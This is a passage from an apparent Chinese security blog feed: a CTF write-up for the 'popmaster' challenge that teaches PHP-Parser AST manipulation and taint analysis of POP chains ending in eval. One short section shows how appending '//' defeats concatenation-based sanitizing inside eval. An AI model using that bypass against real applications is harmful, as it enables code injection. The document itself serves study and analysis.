</span></code></pre></div><h2 id="第八章-文件上传">第八章 文件上传</h2>
<h2 id="第九章-认证与会话管理">第九章 认证与会话管理</h2>
<h2 id="第十章-访问控制">第十章 访问控制</h2>
]]></content>
		</item>
		
		<item>
			<title>popMaster</title>
			<link>https://theoyu.top/posts/popmaster/</link>
			<pubDate>Sat, 09 Oct 2021 23:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/popmaster/</guid>
			<description>强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。
php-parser是一项用PHP编写的PHP解释器，可以把php代码转化为AST，以利于我们静态分析，在回到这道题之前，先简单了解一下php-parser的用法。
一个简单的例子：
&amp;lt;?php use PhpParser\Error; use PhpParser\NodeTraverser; use PhpParser\ParserFactory; require &amp;#39;vendor/autoload.php&amp;#39;; $code = &amp;lt;&amp;lt;&amp;lt;&amp;#39;CODE&amp;#39; &amp;lt;?php $a=&amp;#34;theoyu&amp;#34;; echo($a); CODE; //创建解释器实例 $parser = (new ParserFactory)-&amp;gt;create(ParserFactory::PREFER_PHP7); try { $ast = $parser-&amp;gt;parse($code); var_dump($ast); } catch (Error $error) { echo &amp;#34;Parse error: {$error-&amp;gt;getMessage()}\n&amp;#34;; return; } 首先需要创建一个解释器实例，同时需要指明php版本，对源码进行解析，同时通过PhpParser\Error对代码的异常进行捕获。
array(2) {[0]=&amp;gt;object(PhpParser\Node\Stmt\Expression)#1178 (2) {[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Assign)#1177 (3) {[&amp;#34;var&amp;#34;]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1175 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;expr&amp;#34;]=&amp;gt;object(PhpParser\Node\Scalar\String_)#1176 (2) {[&amp;#34;value&amp;#34;]=&amp;gt;string(6) &amp;#34;theoyu&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(3) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;kind&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(2)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(2)}}[1]=&amp;gt;object(PhpParser\Node\Stmt\Echo_)#1180 (2) {[&amp;#34;exprs&amp;#34;]=&amp;gt;array(1) {[0]=&amp;gt;object(PhpParser\Node\Expr\Variable)#1179 (2) {[&amp;#34;name&amp;#34;]=&amp;gt;string(1) &amp;#34;a&amp;#34;[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}[&amp;#34;attributes&amp;#34;:protected]=&amp;gt;array(2) {[&amp;#34;startLine&amp;#34;]=&amp;gt;int(3)[&amp;#34;endLine&amp;#34;]=&amp;gt;int(3)}}}可以使用NodeDumper更加直观的查看AST
use PhpParser\NodeDumper; $dumper = new NodeDumper; echo $dumper-&amp;gt;dump($ast) ; array(0:Stmt_Expression(expr:Expr_Assign(var:Expr_Variable(name:a)expr:Scalar_String(value:theoyu)))1:Stmt_Echo(exprs:array(0:Expr_Variable(name:a))))回到源码</description>
			<content type="html"><![CDATA[<p>强网杯popmaster这题一直耿耿于怀，用正则毕竟不是作者的本意。刚好在看静态分析这块，纯理论实在太难顶，就再重新揣摩揣摩。</p>
<p><a href="https://github.com/nikic/PHP-Parser">php-parser</a>是一项用PHP编写的PHP解释器，可以把php代码转化为AST，以利于我们静态分析，在回到这道题之前，先简单了解一下php-parser的用法。</p>
<p>一个简单的例子：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">use</span> <span class="nx">PhpParser\Error</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\NodeTraverser</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\ParserFactory</span><span class="p">;</span>
<span class="k">require</span> <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
<span class="nv">$code</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">CODE</span><span class="s">&#39;
</span><span class="s">&lt;?php
</span><span class="s">$a=&#34;theoyu&#34;;
</span><span class="s">echo($a);
</span><span class="s"></span><span class="dl">CODE</span><span class="p">;</span>
<span class="c1">//创建解释器实例
</span><span class="c1"></span><span class="nv">$parser</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="nx">ParserFactory</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">create</span><span class="p">(</span><span class="nx">ParserFactory</span><span class="o">::</span><span class="na">PREFER_PHP7</span><span class="p">);</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$ast</span> <span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">parse</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
  	<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">);</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">Error</span> <span class="nv">$error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&#34;Parse error: </span><span class="si">{</span><span class="nv">$error</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">()</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>首先需要创建一个解释器实例，同时需要指明php版本，对源码进行解析，同时通过<code>PhpParser\Error</code>对代码的异常进行捕获。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">array(2) {</span><span class="w">
</span><span class="w">  </span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">  </span><span class="l">object(PhpParser\Node\Stmt\Expression)#1178 (2) {</span><span class="w">
</span><span class="w">    </span><span class="p">[</span><span class="s2">&#34;expr&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">    </span><span class="l">object(PhpParser\Node\Expr\Assign)#1177 (3) {</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;var&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">object(PhpParser\Node\Expr\Variable)#1175 (2) {</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">string(1) &#34;a&#34;</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">array(2) {</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(2)</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(2)</span><span class="w">
</span><span class="w">        </span>}<span class="w">
</span><span class="w">      </span>}<span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;expr&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">object(PhpParser\Node\Scalar\String_)#1176 (2) {</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;value&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">string(6) &#34;theoyu&#34;</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">array(3) {</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(2)</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(2)</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;kind&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(2)</span><span class="w">
</span><span class="w">        </span>}<span class="w">
</span><span class="w">      </span>}<span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">array(2) {</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">int(2)</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">int(2)</span><span class="w">
</span><span class="w">      </span>}<span class="w">
</span><span class="w">    </span>}<span class="w">
</span><span class="w">    </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">    </span><span class="l">array(2) {</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">int(2)</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">int(2)</span><span class="w">
</span><span class="w">    </span>}<span class="w">
</span><span class="w">  </span>}<span class="w">
</span><span class="w">  </span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">  </span><span class="l">object(PhpParser\Node\Stmt\Echo_)#1180 (2) {</span><span class="w">
</span><span class="w">    </span><span class="p">[</span><span class="s2">&#34;exprs&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">    </span><span class="l">array(1) {</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="m">0</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">object(PhpParser\Node\Expr\Variable)#1179 (2) {</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">string(1) &#34;a&#34;</span><span class="w">
</span><span class="w">        </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">        </span><span class="l">array(2) {</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(3)</span><span class="w">
</span><span class="w">          </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">          </span><span class="l">int(3)</span><span class="w">
</span><span class="w">        </span>}<span class="w">
</span><span class="w">      </span>}<span class="w">
</span><span class="w">    </span>}<span class="w">
</span><span class="w">    </span><span class="p">[</span><span class="s2">&#34;attributes&#34;</span><span class="p">:</span><span class="l">protected]=&gt;</span><span class="w">
</span><span class="w">    </span><span class="l">array(2) {</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;startLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">int(3)</span><span class="w">
</span><span class="w">      </span><span class="p">[</span><span class="s2">&#34;endLine&#34;</span><span class="p">]</span><span class="l">=&gt;</span><span class="w">
</span><span class="w">      </span><span class="l">int(3)</span><span class="w">
</span><span class="w">    </span>}<span class="w">
</span><span class="w">  </span>}<span class="w">
</span><span class="w"></span>}<span class="w">
</span></code></pre></div><p>可以使用NodeDumper更加直观的查看AST</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">use</span> <span class="nx">PhpParser\NodeDumper</span><span class="p">;</span>
<span class="nv">$dumper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NodeDumper</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$dumper</span><span class="o">-&gt;</span><span class="na">dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">)</span> <span class="p">;</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="l">array(</span><span class="w">
</span><span class="w">    </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Stmt_Expression(</span><span class="w">
</span><span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Assign(</span><span class="w">
</span><span class="w">            </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l">Scalar_String(</span><span class="w">
</span><span class="w">                </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">theoyu</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">    </span><span class="l">)</span><span class="w">
</span><span class="w">    </span><span class="nt">1</span><span class="p">:</span><span class="w"> </span><span class="l">Stmt_Echo(</span><span class="w">
</span><span class="w">        </span><span class="nt">exprs</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">            </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">    </span><span class="l">)</span><span class="w">
</span><span class="w"></span><span class="l">)</span><span class="w">
</span></code></pre></div><p>回到源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;theoyu&#34;</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">如果我们想改为：
</span><span class="err">&lt;?php
</span><span class="err">$a=&#34;hacker&#34;;
</span><span class="err">print($a);
</span><span class="err">?&gt;
</span></code></pre></div><p>对于<code>$a</code>而言，我们可以直接访问AST数组来修改其内容。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">);</span><span class="c1">//string(6) &#34;theoyu&#34;
</span><span class="c1"></span><span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$ast</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">expr</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">);</span><span class="c1">//string(6) &#34;hacker&#34;
</span></code></pre></div><p>不过要想修改函数<code>echo</code>可就没这么简单了，php-parser提供了一个用于访问和遍历AST结点的接口<code>PhpParser\NodeTraverser</code>，同时我们可以自定义继承<code>NodeVisitorAbstract</code>   的<code>visitor</code>，在里面实现需要对AST的操作，即可在遍历结点时达到对AST修改的目的。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">NameNodeVisitor</span> <span class="k">extends</span> <span class="nx">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">leaveNode</span><span class="p">(</span><span class="nx">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="nx">instanceof</span> <span class="nx">Node\Scalar\String_</span><span class="p">){</span>
            <span class="nv">$node</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>不过对于echo的修改就没那么容易</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">PrintNodeVisitor</span> <span class="k">extends</span>  <span class="nx">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">leaveNode</span><span class="p">(</span><span class="nx">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="nx">instanceof</span> <span class="nx">Node\Stmt\Echo_</span><span class="p">){</span>
			<span class="c1">//return ...
</span><span class="c1"></span>       <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>这里我们需要直接返回一个<code>print($a)</code> 的结点，也就是</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="na">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span> <span class="c1">//&#34;name&#34;
</span><span class="c1"></span><span class="k">return</span> <span class="k">new</span> <span class="nx">PhpParser\Node\Stmt\Expression</span><span class="p">(</span><span class="k">new</span> <span class="nx">Node\Expr\Print_</span><span class="p">(</span><span class="k">new</span> <span class="nx">PhpParser\Node\Expr\Variable</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="na">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">)));</span>
</code></pre></div><p><code>PrettyPrinter\Standard</code>可以帮助我们从AST复原到源代码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">use</span> <span class="nx">PhpParser\Error</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\ParserFactory</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\NodeDumper</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\NodeTraverser</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\Node</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\NodeVisitorAbstract</span><span class="p">;</span>
<span class="k">use</span> <span class="nx">PhpParser\PrettyPrinter</span><span class="p">;</span>


<span class="k">require</span> <span class="s2">&#34;vendor/autoload.php&#34;</span><span class="p">;</span>
<span class="nv">$code</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;&#39;</span><span class="dl">CODE</span><span class="s">&#39;
</span><span class="s">&lt;?php
</span><span class="s">$name=&#34;theoyu&#34;;
</span><span class="s">echo($name);
</span><span class="s"></span><span class="dl">CODE</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">NameNodeVisitor</span> <span class="k">extends</span> <span class="nx">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">leaveNode</span><span class="p">(</span><span class="nx">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="nx">instanceof</span> <span class="nx">Node\Scalar\String_</span><span class="p">){</span>
            <span class="nv">$node</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">PrintNodeVisitor</span> <span class="k">extends</span>  <span class="nx">NodeVisitorAbstract</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">leaveNode</span><span class="p">(</span><span class="nx">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
       <span class="k">if</span> <span class="p">(</span><span class="nv">$node</span> <span class="nx">instanceof</span> <span class="nx">Node\Stmt\Echo_</span><span class="p">){</span>
<span class="c1">//           var_dump($node-&gt;exprs[0]-&gt;name); //&#34;name&#34;
</span><span class="c1"></span>            <span class="k">return</span> <span class="k">new</span> <span class="nx">PhpParser\Node\Stmt\Expression</span><span class="p">(</span><span class="k">new</span> <span class="nx">Node\Expr\Print_</span><span class="p">(</span><span class="k">new</span> <span class="nx">PhpParser\Node\Expr\Variable</span><span class="p">(</span><span class="nv">$node</span><span class="o">-&gt;</span><span class="na">exprs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">)));</span>
       <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$parser</span><span class="o">=</span><span class="p">(</span><span class="k">new</span> <span class="nx">ParserFactory</span><span class="p">())</span><span class="o">-&gt;</span><span class="na">create</span><span class="p">(</span><span class="nx">ParserFactory</span><span class="o">::</span><span class="na">PREFER_PHP7</span><span class="p">);</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="nv">$ast</span><span class="o">=</span> <span class="nv">$parser</span><span class="o">-&gt;</span><span class="na">parse</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
    <span class="nv">$traverser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NodeTraverser</span><span class="p">();</span>
    <span class="nv">$traverser</span><span class="o">-&gt;</span><span class="na">addVisitor</span><span class="p">(</span><span class="k">new</span> <span class="nx">NameNodeVisitor</span><span class="p">());</span>
    <span class="nv">$traverser</span><span class="o">-&gt;</span><span class="na">addVisitor</span><span class="p">(</span><span class="k">new</span> <span class="nx">PrintNodeVisitor</span><span class="p">());</span>
    <span class="nv">$out</span><span class="o">=</span><span class="nv">$traverser</span><span class="o">-&gt;</span><span class="na">traverse</span><span class="p">(</span><span class="nv">$ast</span><span class="p">);</span>

    <span class="nv">$prettyPrinter</span><span class="o">=</span> <span class="k">new</span> <span class="nx">PrettyPrinter\Standard</span><span class="p">();</span>
    <span class="nv">$new_code</span><span class="o">=</span><span class="nv">$prettyPrinter</span><span class="o">-&gt;</span><span class="na">prettyPrintFile</span><span class="p">(</span><span class="nv">$out</span><span class="p">);</span>
    <span class="k">echo</span> <span class="nv">$code</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&#34;---After Parser--- </span><span class="se">\n\n</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="nv">$new_code</span><span class="p">;</span>

<span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">Error</span> <span class="nv">$e</span><span class="p">){</span>
    <span class="k">echo</span> <span class="s1">&#39;Parse Error: &#39;</span><span class="p">,</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div><p>输出</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;theoyu&#34;</span><span class="p">;</span>
<span class="k">echo</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">
</span><span class="err">---After Parser--- 
</span><span class="err">
</span><span class="err">&lt;?php
</span><span class="err">
</span><span class="err">$name = &#34;hacker&#34;;
</span><span class="err">print $name;
</span></code></pre></div><p>很好奇为什么中间多了一行空行。。</p>
<p>简单认识了php-parser后，让我们重新回到popmaster的16w行代码。</p>
<p>先看下面这一个类：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211012002816.png" alt="image-20211006152537265"></p>
<p><code>c830sD</code>是我们的入口函数，往下两个if语句构成了两个分支，实际上本题也就是需要我们从一个一个分支后找到正确的一条路径。</p>
<p>因为参数可控，把输入的参数定为污点，每次跳转到新的一层则可看作污点传播，如果在最后eval语句里污点仍存在，即可输出路径。那现在我们也就需要关注到特殊的程序点(Sink)，是否有对污点的消毒处理是否有效。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211012002825.png" alt="image-20211006160304743"></p>
<p>在上面的例子里，第一项虽然对eval语句里的参数进行了字符串拼接，但我们只要在命令执行的后面加上<code>//</code>即可无视拼接语句，故消毒无效。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;echo 3;//echo 4;&#34;</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="mi">3</span>
</code></pre></div><p>再看下面的消毒，虽然尝试替换变量，并没有替换关键变量，可以看作无效消毒。</p>
<p>这样来看，只有直接把关键变量替换这一种有效消毒方式。</p>
<p>后面结合@Heihu577<a href="https://gitee.com/He1huKey/popmaster/blob/master/popmaster.zip">代码</a>谈谈具体污点分析的实现。</p>
<p>作者首先在污点分析前，创建了一个DelCallVisitor对整个AST进行了一次遍历，如下所示</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">DelCallVisitor</span> <span class="k">extends</span> <span class="nx">NodeVisitorAbstract</span> <span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">leaveNode</span><span class="p">(</span><span class="nx">Node</span> <span class="nv">$node</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$node</span> <span class="nx">instanceof</span> <span class="nx">Node\Stmt\If_</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="na">cond</span> <span class="nx">instanceof</span> <span class="nx">FuncCall</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="na">cond</span> <span class="o">-&gt;</span> <span class="na">name</span> <span class="o">-&gt;</span> <span class="na">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;method_exists&#39;</span>
        <span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$node</span> <span class="o">-&gt;</span> <span class="na">stmts</span><span class="p">){</span>
                <span class="k">return</span> <span class="nv">$node</span> <span class="o">-&gt;</span> <span class="na">stmts</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>比如原语句为</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rHzhIHw</span><span class="p">,</span> <span class="s1">&#39;kzPUMm&#39;</span><span class="p">))</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rHzhIHw</span><span class="o">-&gt;</span><span class="na">kzPUMm</span><span class="p">(</span><span class="nv">$NEaSt</span><span class="p">);</span>
</code></pre></div><p>AST为</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">stmts</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">    </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Stmt_If(</span><span class="w">
</span><span class="w">        </span><span class="nt">cond</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_FuncCall(</span><span class="w">
